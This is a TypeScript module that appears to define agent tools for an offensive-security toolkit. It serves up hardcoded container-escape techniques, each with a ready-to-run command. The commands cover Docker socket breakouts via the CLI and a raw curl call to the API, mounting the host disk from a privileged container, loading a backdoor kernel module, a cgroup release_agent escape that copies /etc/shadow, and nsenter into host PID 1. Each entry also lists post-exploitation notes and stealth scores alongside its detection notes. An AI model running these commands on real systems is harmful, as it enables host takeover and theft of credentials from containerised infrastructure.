import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform } from "../schema/unified-entry.js";

// ━━━ Helpers ━━━

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id, binary: e.binary, platform: e.platform, catalog: e.catalogSource,
    functions: e.functions, stealth_score: e.stealthScore, description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

// ━━━ Hardcoded Container Escape Data ━━━

interface EscapeTechnique {
  vector: string;
  description: string;
  prerequisites: string[];
  command: string;
  postExploitation: string;
  detectionNotes: string;
  attck: string[];
  stealthScore: number;
}

const DOCKER_SOCKET_ESCAPES: EscapeTechnique[] = [
  {
    vector: "Docker Socket Mount",
    description: "Escape via mounted Docker socket (/var/run/docker.sock) to create privileged containers on host",
    prerequisites: ["/var/run/docker.sock mounted inside container", "Docker CLI or curl available"],
    command: "docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host",
    postExploitation: "Full host filesystem access. Can install backdoors, read secrets, pivot to other containers.",
    detectionNotes: "Monitor for container creation from within containers. Audit docker.sock mount in pod specs.",
    attck: ["T1611", "T1610"],
    stealthScore: 3,
  },
  {
    vector: "Docker Socket API",
    description: "Use Docker API directly via curl on the socket to spawn host-level containers",
    prerequisites: ["/var/run/docker.sock mounted", "curl available"],
    command: 'curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" -H "Content-Type: application/json" -d \'{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}\'',
    postExploitation: "Same as Docker socket mount. Full host access.",
    detectionNotes: "Monitor HTTP requests to Docker socket. Audit container creation events.",
    attck: ["T1611", "T1610"],
    stealthScore: 3,
  },
];

const PRIVILEGED_ESCAPES: EscapeTechnique[] = [
  {
    vector: "Privileged Container - Mount Host Disk",
    description: "Escape from privileged container by mounting the host disk device",
    prerequisites: ["Container running with --privileged flag"],
    command: "fdisk -l && mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host",
    postExploitation: "Full host filesystem access via device mount. Can modify host binaries and configs.",
    detectionNotes: "Monitor for mount syscalls from containers. Audit privileged container deployments.",
    attck: ["T1611"],
    stealthScore: 3,
  },
  {
    vector: "Privileged Container - Load Kernel Module",
    description: "Load a malicious kernel module from a privileged container to gain kernel-level access",
    prerequisites: ["Container running with --privileged flag", "Kernel headers or pre-compiled module"],
    command: "insmod /path/to/backdoor.ko",
    postExploitation: "Kernel-level persistence on host. Can hide processes, intercept syscalls.",
    detectionNotes: "Monitor insmod/modprobe from container contexts. Audit loaded kernel modules.",
    attck: ["T1611", "T1547.006"],
    stealthScore: 2,
  },
];

const CAP_SYS_ADMIN_ESCAPES: EscapeTechnique[] = [
  {
    vector: "CAP_SYS_ADMIN - cgroup release_agent",
    description: "Exploit cgroup release_agent to execute commands on the host from a CAP_SYS_ADMIN container",
    prerequisites: ["CAP_SYS_ADMIN capability", "cgroup v1 on host"],
    command: "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab) && echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && echo '#!/bin/sh' > /cmd && echo 'cat /etc/shadow > /output' >> /cmd && chmod a+x /cmd && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"",
    postExploitation: "Arbitrary command execution on host via cgroup release_agent mechanism.",
    detectionNotes: "Monitor cgroup mount and release_agent modification. Audit CAP_SYS_ADMIN containers.",
    attck: ["T1611"],
    stealthScore: 2,
  },
  {
    vector: "CAP_SYS_ADMIN - Mount Overlay",
    description: "Abuse CAP_SYS_ADMIN to mount overlayfs and access host filesystem layers",
    prerequisites: ["CAP_SYS_ADMIN capability"],
    command: "mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work /mnt",
    postExploitation: "Read-only access to host filesystem via overlay mount.",
    detectionNotes: "Monitor overlay mount syscalls from containers.",
    attck: ["T1611"],
    stealthScore: 2,
  },
];

const NSENTER_ESCAPES: EscapeTechnique[] = [
  {
    vector: "nsenter to Host PID 1",
    description: "Use nsenter to enter the host namespaces via PID 1 (init/systemd)",
    prerequisites: ["hostPID: true or --pid=host", "nsenter binary available"],
    command: "nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
    postExploitation: "Full host shell in all host namespaces. Complete host compromise.",
    detectionNotes: "Monitor nsenter execution targeting PID 1. Audit hostPID pod specs.",
    attck: ["T1611"],
    stealthScore: 3,
  },
  {
    vector: "nsenter Selective Namespace",
    description: "Use nsenter to selectively enter specific host namespaces for targeted access",
    prerequisites: ["hostPID: true", "nsenter binary"],
    command: "nsenter --target 1 --mount -- cat /etc/shadow",
    postExploitation: "Targeted host filesystem or network access without full namespace entry.",
    detectionNotes: "Monitor nsenter with --target 1. Check which namespaces are entered.",
    attck: ["T1611"],
    stealthScore: 2,
  },
];

const CGROUP_ESCAPES: EscapeTechnique[] = [
  {
    vector: "cgroup Notification Escape",
    description: "Abuse cgroup notify_on_release to execute host commands when a cgroup is released",
    prerequisites: ["CAP_SYS_ADMIN or privileged mode", "cgroup v1"],
    command: "# Create cgroup, set release_agent to host path, trigger release\nmkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/escape && echo 1 > /tmp/cgrp/escape/notify_on_release && echo '/path/on/host/cmd.sh' > /tmp/cgrp/release_agent",
    postExploitation: "Command execution on host triggered by cgroup lifecycle events.",
    detectionNotes: "Monitor cgroup release_agent writes. Audit cgroup mount operations.",
    attck: ["T1611"],
    stealthScore: 2,
  },
  {
    vector: "OverlayFS CVE Escape",
    description: "Exploit OverlayFS vulnerabilities (e.g. CVE-2023-0386) for container escape via file capability manipulation",
    prerequisites: ["Vulnerable kernel version", "Unprivileged user namespaces enabled"],
    command: "# Requires specific exploit code for the CVE version",
    postExploitation: "Privilege escalation to root on host via kernel vulnerability.",
    detectionNotes: "Patch kernel. Monitor for overlayfs exploits and unexpected setuid files.",
    attck: ["T1611", "T1068"],
    stealthScore: 2,
  },
];

// ━━━ Tools ━━━

const container_docker_socket: ToolDef = {
  name: "container_docker_socket",
  description: "Find Docker socket mount escape techniques for container breakout via /var/run/docker.sock",
  schema: {
    method: z.enum(["cli", "api", "all"]).default("all")
      .describe("Escape method: 'cli' for Docker CLI, 'api' for direct socket API, or 'all'"),
  },
  async execute(args: { method?: string }, ctx: ToolContext): Promise<ToolResult> {
    const method = args.method || "all";
    let techniques = [...DOCKER_SOCKET_ESCAPES];

    if (method === "cli") {
      techniques = techniques.filter(t => !t.vector.includes("API"));
    } else if (method === "api") {
      techniques = techniques.filter(t => t.vector.includes("API"));
    }

    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword("docker"));

    return json({
      escape_type: "docker_socket",
      method_filter: method,
      total_techniques: techniques.length,
      techniques: techniques.map(t => ({
        vector: t.vector,
        description: t.description,
        prerequisites: t.prerequisites,
        command: t.command,
        post_exploitation: t.postExploitation,
        detection_notes: t.detectionNotes,
        attck: t.attck,
        stealth_score: t.stealthScore,
      })),
      kb_matches: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

const container_privileged: ToolDef = {
  name: "container_privileged",
  description: "Find privileged container escape techniques (disk mount, kernel module loading)",
  schema: {
    technique: z.enum(["mount", "kernel_module", "all"]).default("all")
      .describe("Specific privileged escape technique to look up"),
  },
  async execute(args: { technique?: string }, ctx: ToolContext): Promise<ToolResult> {
    const technique = args.technique || "all";
    let techniques = [...PRIVILEGED_ESCAPES];

    if (technique === "mount") {
      techniques = techniques.filter(t => t.vector.includes("Mount"));
    } else if (technique === "kernel_module") {
      techniques = techniques.filter(t => t.vector.includes("Kernel Module"));
    }

    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword("mount", "linux"));

    return json({
      escape_type: "privileged_container",
      technique_filter: technique,
      total_techniques: techniques.length,
      techniques: techniques.map(t => ({
        vector: t.vector,
        description: t.description,
        prerequisites: t.prerequisites,
        command: t.command,
        post_exploitation: t.postExploitation,
        detection_notes: t.detectionNotes,
        attck: t.attck,
        stealth_score: t.stealthScore,
      })),
      kb_matches: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

const container_cap_sys_admin: ToolDef = {
  name: "container_cap_sys_admin",
  description: "Find CAP_SYS_ADMIN container escape techniques (cgroup release_agent, overlay mount)",
  schema: {
    technique: z.enum(["cgroup", "overlay", "all"]).default("all")
      .describe("Specific CAP_SYS_ADMIN escape technique to look up"),
  },
  async execute(args: { technique?: string }, ctx: ToolContext): Promise<ToolResult> {
    const technique = args.technique || "all";
    let techniques = [...CAP_SYS_ADMIN_ESCAPES];

    if (technique === "cgroup") {
      techniques = techniques.filter(t => t.vector.includes("cgroup"));
    } else if (technique === "overlay") {
      techniques = techniques.filter(t => t.vector.includes("Overlay"));
    }

    return json({
      escape_type: "cap_sys_admin",
      technique_filter: technique,
      total_techniques: techniques.length,
      techniques: techniques.map(t => ({
        vector: t.vector,
        description: t.description,
        prerequisites: t.prerequisites,
        command: t.command,
        post_exploitation: t.postExploitation,
        detection_notes: t.detectionNotes,
        attck: t.attck,
        stealth_score: t.stealthScore,
      })),
    });
  },
};

const container_nsenter: ToolDef = {
  name: "container_nsenter",
  description: "Find nsenter-based container escape techniques for entering host namespaces",
  schema: {
    scope: z.enum(["full", "selective", "all"]).default("all")
      .describe("Namespace entry scope: 'full' for all namespaces, 'selective' for targeted access"),
  },
  async execute(args: { scope?: string }, ctx: ToolContext): Promise<ToolResult> {
    const scope = args.scope || "all";
    let techniques = [...NSENTER_ESCAPES];

    if (scope === "full") {
      techniques = techniques.filter(t => t.vector.includes("PID 1"));
    } else if (scope === "selective") {
      techniques = techniques.filter(t => t.vector.includes("Selective"));
    }

    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword("nsenter"));

    return json({
      escape_type: "nsenter",
      scope_filter: scope,
      total_techniques: techniques.length,
      techniques: techniques.map(t => ({
        vector: t.vector,
        description: t.description,
        prerequisites: t.prerequisites,
        command: t.command,
        post_exploitation: t.postExploitation,
        detection_notes: t.detectionNotes,
        attck: t.attck,
        stealth_score: t.stealthScore,
      })),
      kb_matches: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

const container_cgroup: ToolDef = {
  name: "container_cgroup",
  description: "Find cgroup-based container escape techniques (notify_on_release, OverlayFS CVEs)",
  schema: {
    technique: z.enum(["notification", "overlayfs_cve", "all"]).default("all")
      .describe("Specific cgroup escape technique to look up"),
  },
  async execute(args: { technique?: string }, ctx: ToolContext): Promise<ToolResult> {
    const technique = args.technique || "all";
    let techniques = [...CGROUP_ESCAPES];

    if (technique === "notification") {
      techniques = techniques.filter(t => t.vector.includes("Notification"));
    } else if (technique === "overlayfs_cve") {
      techniques = techniques.filter(t => t.vector.includes("OverlayFS"));
    }

    return json({
      escape_type: "cgroup",
      technique_filter: technique,
      total_techniques: techniques.length,
      techniques: techniques.map(t => ({
        vector: t.vector,
        description: t.description,
        prerequisites: t.prerequisites,
        command: t.command,
        post_exploitation: t.postExploitation,
        detection_notes: t.detectionNotes,
        attck: t.attck,
        stealth_score: t.stealthScore,
      })),
    });
  },
};

export const containerEscapeTools: ToolDef[] = [
  container_docker_socket,
  container_privileged,
  container_cap_sys_admin,
  container_nsenter,
  container_cgroup,
];
